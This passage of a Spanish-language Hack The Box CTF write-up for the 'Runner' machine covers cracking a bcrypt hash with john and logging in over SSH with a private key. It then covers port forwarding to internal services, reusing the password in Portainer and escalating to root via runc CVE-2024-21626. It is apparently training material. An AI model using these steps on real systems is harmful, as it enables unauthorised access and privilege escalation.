+  <span class="mi">12</span><span class="p">,</span> <span class="n">city_adminvb7m</span><span class="p">,</span> <span class="err">$</span><span class="mi">2</span><span class="n">a</span><span class="err">$</span><span class="mi">07</span><span class="err">$</span><span class="n">MjRIMfFQyaBzNAy8BVbS</span><span class="p">..</span><span class="n">snX3Zz0npHUZP7wdonGIdN9oxtkqYyS</span><span class="p">,</span> <span class="p">,</span> <span class="n">angry</span><span class="o">-</span><span class="n">admin</span><span class="o">@</span><span class="n">funnybunny</span><span class="p">.</span><span class="n">org</span><span class="p">,</span> <span class="mi">1723754746653</span><span class="p">,</span> <span class="n">BCRYPT</span>
+</code></pre></div>    </div>
+
+    <p>Hemos encontrado la contraseña <code class="language-plaintext highlighter-rouge">piper123</code>, la cual nos será útil más adelante</p>
+
+    <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="n">john</span> <span class="o">--</span><span class="n">wordlist</span><span class="o">=</span><span class="n">wordlist</span> <span class="nb">hash</span>
+  <span class="n">Using</span> <span class="n">default</span> <span class="nb">input</span> <span class="n">encoding</span><span class="p">:</span> <span class="n">UTF</span><span class="o">-</span><span class="mi">8</span>
+  <span class="n">Loaded</span> <span class="mi">4</span> <span class="n">password</span> <span class="n">hashes</span> <span class="k">with</span> <span class="mi">4</span> <span class="n">different</span> <span class="n">salts</span> <span class="p">(</span><span class="n">bcrypt</span> <span class="p">[</span><span class="n">Blowfish</span> <span class="mi">32</span><span class="o">/</span><span class="mi">64</span> <span class="n">X3</span><span class="p">])</span>
+  <span class="n">Cost</span> <span class="mi">1</span> <span class="p">(</span><span class="n">iteration</span> <span class="n">count</span><span class="p">)</span> <span class="ow">is</span> <span class="mi">128</span> <span class="k">for</span> <span class="nb">all</span> <span class="n">loaded</span> <span class="n">hashes</span>
+  <span class="n">Will</span> <span class="n">run</span> <span class="mi">2</span> <span class="n">OpenMP</span> <span class="n">threads</span>
+  <span class="n">Press</span> <span class="s">'q'</span> <span class="ow">or</span> <span class="n">Ctrl</span><span class="o">-</span><span class="n">C</span> <span class="n">to</span> <span class="n">abort</span><span class="p">,</span> <span class="n">almost</span> <span class="nb">any</span> <span class="n">other</span> <span class="n">key</span> <span class="k">for</span> <span class="n">status</span>
+  <span class="nb">Warning</span><span class="p">:</span> <span class="n">Only</span> <span class="mi">1</span> <span class="n">candidate</span> <span class="n">left</span><span class="p">,</span> <span class="n">minimum</span> <span class="mi">6</span> <span class="n">needed</span> <span class="k">for</span> <span class="n">performance</span><span class="p">.</span>
+  <span class="n">piper123</span>         <span class="p">(</span><span class="err">?</span><span class="p">)</span>
+  <span class="mi">1</span><span class="n">g</span> <span class="mi">0</span><span class="p">:</span><span class="mi">00</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mi">56</span> <span class="n">DONE</span> <span class="p">(</span><span class="mi">2024</span><span class="o">-</span><span class="mi">08</span><span class="o">-</span><span class="mi">15</span> <span class="mi">23</span><span class="p">:</span><span class="mi">43</span><span class="p">)</span> <span class="mf">20.00</span><span class="n">g</span><span class="o">/</span><span class="n">s</span> <span class="mf">20.00</span><span class="n">p</span><span class="o">/</span><span class="n">s</span> <span class="mf">80.00</span><span class="n">c</span><span class="o">/</span><span class="n">s</span> <span class="mf">80.00</span><span class="n">C</span><span class="o">/</span><span class="n">s</span> <span class="n">piper123</span>
+  <span class="n">Use</span> <span class="n">the</span> <span class="s">"--show"</span> <span class="n">option</span> <span class="n">to</span> <span class="n">display</span> <span class="nb">all</span> <span class="n">of</span> <span class="n">the</span> <span class="n">cracked</span> <span class="n">passwords</span> <span class="n">reliably</span>
+  <span class="n">Session</span> <span class="n">completed</span><span class="p">.</span>
+</code></pre></div>    </div>
+
+    <h1 id="acceso-a-la-máquina-con-ssh">Acceso a la máquina con ssh</h1>
+
+    <p>Ahora nos conectaremos por <code class="language-plaintext highlighter-rouge">ssh</code> primero de todo le damos permisos <code class="language-plaintext highlighter-rouge">chmod 600 id_rsa</code> y luego <code class="language-plaintext highlighter-rouge">ssh -i john@10.10.11.13 -i id_rsa</code></p>
+
+    <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="n">ssh</span> <span class="n">john</span><span class="o">@</span><span class="mf">10.10</span><span class="p">.</span><span class="mf">11.13</span> <span class="o">-</span><span class="n">i</span> <span class="n">id_rsa</span>
+  <span class="n">Welcome</span> <span class="n">to</span> <span class="n">Ubuntu</span> <span class="mf">22.04</span><span class="p">.</span><span class="mi">4</span> <span class="n">LTS</span> <span class="p">(</span><span class="n">GNU</span><span class="o">/</span><span class="n">Linux</span> <span class="mf">5.15</span><span class="p">.</span><span class="mi">0</span><span class="o">-</span><span class="mi">102</span><span class="o">-</span><span class="n">generic</span> <span class="n">x86_64</span><span class="p">)</span>
+    
+   <span class="o">*</span> <span class="n">Documentation</span><span class="p">:</span>  <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">help</span><span class="p">.</span><span class="n">ubuntu</span><span class="p">.</span><span class="n">com</span>
+   <span class="o">*</span> <span class="n">Management</span><span class="p">:</span>     <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">landscape</span><span class="p">.</span><span class="n">canonical</span><span class="p">.</span><span class="n">com</span>
+   <span class="o">*</span> <span class="n">Support</span><span class="p">:</span>        <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">ubuntu</span><span class="p">.</span><span class="n">com</span><span class="o">/</span><span class="n">pro</span>
+</code></pre></div>    </div>
+
+    <p>Y si hacemos un <code class="language-plaintext highlighter-rouge">ls</code>encontraremos el <code class="language-plaintext highlighter-rouge">user.txt(flag)</code></p>
+
+    <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="n">john</span><span class="o">@</span><span class="n">runner</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">ls</span>
+  <span class="n">user</span><span class="p">.</span><span class="n">txt</span>
+</code></pre></div>    </div>
+
+    <h1 id="escalada-a-root">Escalada a <code class="language-plaintext highlighter-rouge">root</code></h1>
+
+    <p>Si miramos los puertos que corren en la máquina víctima con el comando <code class="language-plaintext highlighter-rouge">netstat -ntlp</code>, encontramos varios puertos que nos llaman la atención</p>
+
+    <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="n">john</span><span class="o">@</span><span class="n">runner</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">netstat</span> <span class="o">-</span><span class="n">nltp</span>
+  <span class="n">Active</span> <span class="n">Internet</span> <span class="n">connections</span> <span class="p">(</span><span class="n">only</span> <span class="n">servers</span><span class="p">)</span>
+  <span class="n">Proto</span> <span class="n">Recv</span><span class="o">-</span><span class="n">Q</span> <span class="n">Send</span><span class="o">-</span><span class="n">Q</span> <span class="n">Local</span> <span class="n">Address</span>           <span class="n">Foreign</span> <span class="n">Address</span>         <span class="n">State</span>       <span class="n">PID</span><span class="o">/</span><span class="n">Program</span> <span class="n">name</span>
+  <span class="n">tcp</span>        <span class="mi">0</span>      <span class="mi">0</span> <span class="mf">127.0</span><span class="p">.</span><span class="mf">0.1</span><span class="p">:</span><span class="mi">9443</span>          <span class="mf">0.0</span><span class="p">.</span><span class="mf">0.0</span><span class="p">:</span><span class="o">*</span>               <span class="n">LISTEN</span>      <span class="o">-</span>
+  <span class="n">tcp</span>        <span class="mi">0</span>      <span class="mi">0</span> <span class="mf">127.0</span><span class="p">.</span><span class="mf">0.1</span><span class="p">:</span><span class="mi">8111</span>          <span class="mf">0.0</span><span class="p">.</span><span class="mf">0.0</span><span class="p">:</span><span class="o">*</span>               <span class="n">LISTEN</span>      <span class="o">-</span>
+  <span class="n">tcp</span>        <span class="mi">0</span>      <span class="mi">0</span> <span class="mf">0.0</span><span class="p">.</span><span class="mf">0.0</span><span class="p">:</span><span class="mi">80</span>              <span class="mf">0.0</span><span class="p">.</span><span class="mf">0.0</span><span class="p">:</span><span class="o">*</span>               <span class="n">LISTEN</span>      <span class="o">-</span>
+  <span class="n">tcp</span>        <span class="mi">0</span>      <span class="mi">0</span> <span class="mf">0.0</span><span class="p">.</span><span class="mf">0.0</span><span class="p">:</span><span class="mi">22</span>              <span class="mf">0.0</span><span class="p">.</span><span class="mf">0.0</span><span class="p">:</span><span class="o">*</span>               <span class="n">LISTEN</span>      <span class="o">-</span>
+  <span class="n">tcp</span>        <span class="mi">0</span>      <span class="mi">0</span> <span class="mf">127.0</span><span class="p">.</span><span class="mf">0.53</span><span class="p">:</span><span class="mi">53</span>           <span class="mf">0.0</span><span class="p">.</span><span class="mf">0.0</span><span class="p">:</span><span class="o">*</span>               <span class="n">LISTEN</span>      <span class="o">-</span>
+  <span class="n">tcp</span>        <span class="mi">0</span>      <span class="mi">0</span> <span class="mf">127.0</span><span class="p">.</span><span class="mf">0.1</span><span class="p">:</span><span class="mi">5005</span>          <span class="mf">0.0</span><span class="p">.</span><span class="mf">0.0</span><span class="p">:</span><span class="o">*</span>               <span class="n">LISTEN</span>      <span class="o">-</span>
+  <span class="n">tcp</span>        <span class="mi">0</span>      <span class="mi">0</span> <span class="mf">127.0</span><span class="p">.</span><span class="mf">0.1</span><span class="p">:</span><span class="mi">9000</span>          <span class="mf">0.0</span><span class="p">.</span><span class="mf">0.0</span><span class="p">:</span><span class="o">*</span>               <span class="n">LISTEN</span>      <span class="o">-</span>
+  <span class="n">tcp6</span>       <span class="mi">0</span>      <span class="mi">0</span> <span class="p">:::</span><span class="mi">80</span>                   <span class="p">:::</span><span class="o">*</span>                    <span class="n">LISTEN</span>      <span class="o">-</span>
+  <span class="n">tcp6</span>       <span class="mi">0</span>      <span class="mi">0</span> <span class="p">:::</span><span class="mi">22</span>                   <span class="p">:::</span><span class="o">*</span>                    <span class="n">LISTEN</span>      <span class="o">-</span>
+  <span class="n">tcp6</span>       <span class="mi">0</span>      <span class="mi">0</span> <span class="p">:::</span><span class="mi">8000</span>                 <span class="p">:::</span><span class="o">*</span>                    <span class="n">LISTEN</span>      <span class="o">-</span>
+</code></pre></div>    </div>
+
+    <p>Vamos a aplicar <strong>port forwarding</strong> a dichos puertos para que nuestra máquina local pueda acceder a los servicios que corren en los puertos de la máquina víctima</p>
+
+    <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="n">ssh</span> <span class="o">-</span><span class="n">L</span> <span class="mi">9443</span><span class="p">:</span><span class="mf">127.0</span><span class="p">.</span><span class="mf">0.1</span><span class="p">:</span><span class="mi">9443</span> <span class="o">-</span><span class="n">L</span> <span class="mi">8111</span><span class="p">:</span><span class="mf">127.0</span><span class="p">.</span><span class="mf">0.1</span><span class="p">:</span><span class="mi">8111</span> <span class="o">-</span><span class="n">L</span> <span class="mi">9000</span><span class="p">:</span><span class="mf">127.0</span><span class="p">.</span><span class="mf">0.1</span><span class="p">:</span><span class="mi">9000</span> <span class="o">-</span><span class="n">L</span> <span class="mi">5005</span><span class="p">:</span><span class="mf">127.0</span><span class="p">.</span><span class="mf">0.1</span><span class="p">:</span><span class="mi">5005</span> <span class="n">juan</span><span class="o">@</span><span class="mf">10.10</span><span class="p">.</span><span class="mf">11.13</span> <span class="o">-</span><span class="n">i</span> <span class="n">id_rsa</span>
+</code></pre></div>    </div>
+
+    <p>Si miramos de acceder a <code class="language-plaintext highlighter-rouge">127.0.0.1:9000</code> encontramos este panel de inicio de sesión</p>
+
+    <p><img src="/assets/images/2024-08-07-runner-medium/image%204.png" alt="image.png" /></p>
+
+    <p>Vamos a probar a acceder con el usuario <strong><code class="language-plaintext highlighter-rouge">Matthew</code></strong>y la contraseña descifrada anteriormente, <strong><code class="language-plaintext highlighter-rouge">piper123</code></strong>.</p>
+
+    <p>Como podemos ver en la imagen, se utilizando <strong>Portainer</strong> para gestionar contenedores.</p>
+
+    <p><img src="/assets/images/2024-08-07-runner-medium/image%205.png" alt="image.png" /></p>
+
+    <p>Portainer es una herramienta gráfica para gestionar Docker, pero el software que realmente ejecuta los contenedores en el sistema podría ser <strong>runC</strong>.</p>
+
+    <p>Para confirmar si <strong>runC</strong> está en uso podemos aplicar esto en la máquina victima</p>
+
+    <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="n">runc</span> <span class="o">--</span><span class="n">version</span>
+</code></pre></div>    </div>
+
+    <p>Y efectivamente , tiene <code class="language-plaintext highlighter-rouge">runc v1.1.7</code></p>
+
+    <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="n">john</span><span class="o">@</span><span class="n">runner</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">runc</span> <span class="o">--</span><span class="n">version</span>
+  <span class="n">runc</span> <span class="n">version</span> <span class="mf">1.1</span><span class="p">.</span><span class="mi">7</span><span class="o">-</span><span class="mi">0</span><span class="n">ubuntu1</span><span class="o">~</span><span class="mf">22.04</span><span class="p">.</span><span class="mi">1</span>
+  <span class="n">spec</span><span class="p">:</span> <span class="mf">1.0</span><span class="p">.</span><span class="mi">2</span><span class="o">-</span><span class="n">dev</span>
+  <span class="n">go</span><span class="p">:</span> <span class="n">go1</span><span class="p">.</span><span class="mf">18.1</span>
+  <span class="n">libseccomp</span><span class="p">:</span> <span class="mf">2.5</span><span class="p">.</span><span class="mi">3</span>
+</code></pre></div>    </div>
+
+    <p>Si buscamos en Google por <code class="language-plaintext highlighter-rouge">runc version 1.1.7 vulnerability</code> encontramos esta <a href="https://nitroc.org/en/posts/cve-2024-21626-illustrated/">web</a></p>
+
+    <p>Vamos a explotar está vulnerabilidad</p>
+
+    <p>Primero de todo crearemos un contenedor</p>
+
+    <p><img src="/assets/images/2024-08-07-runner-medium/image%206.png" alt="image.png" /></p>
+
+    <p><img src="/assets/images/2024-08-07-runner-medium/image%207.png" alt="image.png" /></p>
+
+    <p>Una vez hecho esto , se nos creará el contenedor , vamos a acceder y entraremos a la sección de <code class="language-plaintext highlighter-rouge">console</code></p>
+
+    <p><img src="/assets/images/2024-08-07-runner-medium/image%208.png" alt="image.png" /></p>
+
+    <p>Y nos conectaremos como <code class="language-plaintext highlighter-rouge">root</code></p>
+
+    <p><img src="/assets/images/2024-08-07-runner-medium/image%209.png" alt="image.png" /></p>
+
+    <p>Nos saldrá una terminal y somos <code class="language-plaintext highlighter-rouge">root</code></p>
+
+    <p><img src="/assets/images/2024-08-07-runner-medium/image%2010.png" alt="image.png" /></p>
+
+    <h1 id="finalización">Finalización</h1>
+    <p>Espero que hayan aprendido mucho haciendo esta máquina y les haya servido de ayuda mi explicación para poder entender esta <strong>CTF</strong>. Muchas gracias por leer el artículo y no olviden seguirme en <a href="https://github.com/0x832/">GitHub</a>, ya que también iré subiendo herramientas de hacking.</p>
+  </li>
+</ul>
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+
+
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/categories/#ctf" class="page__taxonomy-item" rel="tag">CTF</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/categories/#hack-the-box" class="page__taxonomy-item" rel="tag">Hack the box</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/categories/#pentesting" class="page__taxonomy-item" rel="tag">Pentesting</a>
+    
+    </span>
+  </p>
+
+
+        
+          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2024-08-13T00:00:00+02:00">August 13, 2024</time></p>
+        
+      </footer>
+
+      
+
+      
+  <nav class="pagination">
+    
+      <a href="/snapbot-python-scripting/" class="pagination--pager" title="SnapBot - Python scripting
+">Previous</a>
+    
+    
+      <a href="#" class="pagination--pager disabled">Next</a>
+    
+  </nav>
+
+    </div>
+
+    
+  </article>
+
+  
+</div>
+
+    </div>
+
+    
+
+    <div class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+    
+
+    
+
+    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
+  </ul>
+</div>
+
+<div class="page__footer-copyright">&copy; 2024 0x832</div>
+
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+  <script data-search-pseudo-elements defer src="https://use.fontawesome.com/releases/v5.7.1/js/all.js" integrity="sha384-eVEQC9zshBn0rFj4+TU78eNA19HMNigMviK/PU/FFjLXqa/GKPgX58rvt5Z8PLs7" crossorigin="anonymous"></script>
+
+
+
+
+
+
+
+
+  </body>
+</html>
